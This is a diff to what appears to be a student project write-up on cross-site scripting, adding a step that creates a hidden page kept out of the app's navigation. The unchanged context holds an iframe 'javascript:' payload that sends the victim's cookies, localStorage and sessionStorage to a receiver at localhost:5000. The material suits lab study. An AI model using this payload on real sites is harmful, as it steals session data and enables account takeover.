@@ -143,3 +143,11 @@ payload can be
 <iframe src="javascript:fetch('http://localhost:5000/receiver', {method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify({cookies: document.cookie,localStorage: JSON.stringify(localStorage),sessionStorage: JSON.stringify(sessionStorage)})});"> </iframe>
 ```
 ![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot%20from%202024-12-05%2002-54-11.png))
+
+#### 5. Create the Hidden Page
+
+**Exclude It from Navigation:**
+
+**Do not link this page directly in the app's navigation bar or footer.**
+
+![im1](https://github.com/Sonakhach/project2/blob/main/Screenshot_2024-12-05_16_52_37.png)
